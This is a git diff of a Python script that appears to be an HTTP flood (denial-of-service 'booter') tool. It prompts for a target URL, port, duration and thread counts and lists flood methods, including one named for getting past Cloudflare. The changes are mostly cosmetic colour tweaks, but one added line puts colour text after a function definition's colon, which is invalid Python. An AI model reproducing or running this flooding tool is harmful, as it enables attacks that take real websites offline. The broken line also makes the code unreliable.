@@ -27,8 +27,8 @@ def generate_url_path_pyflooder(num):
     data = "".join(random.sample(msg, int(num)))
     return data
     
-def generate_url_path_choice(num):
-    letter = '''{Fore.BLACK}abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
+def generate_url_path_choice(num):{Fore.BLACK}
+    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
     data = ""
     for _ in range(int(num)):
         data += random.choice(letter)
@@ -109,11 +109,11 @@ port_loader = int(input(f"{Fore.CYAN}PORT (443/80): {Fore.GREEN}"))
 time_loader = time.time() + int(input(f"{Fore.CYAN}TIME: {Fore.GREEN}"))
 spam_loader = int(input(f"{Fore.CYAN}SPAM: {Fore.GREEN}"))
 create_thread = int(input(F"{Fore.CYAN}THREAD: {Fore.GREEN}"))
-booter_sent = int(input(F"{Fore.GREEN}BOOTER: {Fore.GREEN}"))
-print(f"{Fore.LIGHTCYAN_EX}  HTTP METHODS-> CONNECT GET PUT POST")
-print(f"{Fore.LIGHTCYAN_EX}  HTTP METHODS-> SERVER CLOUDFLARE PYFLOODER GATEWAY")
+booter_sent = int(input(F"{Fore.CYAN}BOOTER: {Fore.GREEN}"))
+print(f"{Fore.LIGHTCYAN_EX}HTTP METHODS-> CONNECT GET PUT POST")
+print(f"{Fore.LIGHTCYAN_EX}HTTP METHODS-> SERVER CLOUDFLARE PYFLOODER GATEWAY")
 methods_loader = input(F"{Fore.LIGHTCYAN}HTTP_METHODS: {Fore.GREEN}").upper()
-spam_create_thread = int(input(F"{Fore.LIGHTCYAan_EX}SPAM CREATE: {Fore.GREEN}"))
+spam_create_thread = int(input(F"{Fore.CYAN}SPAM CREATE: {Fore.GREEN}"))
 print(f"{Fore.BLACK}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
 try:
     host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
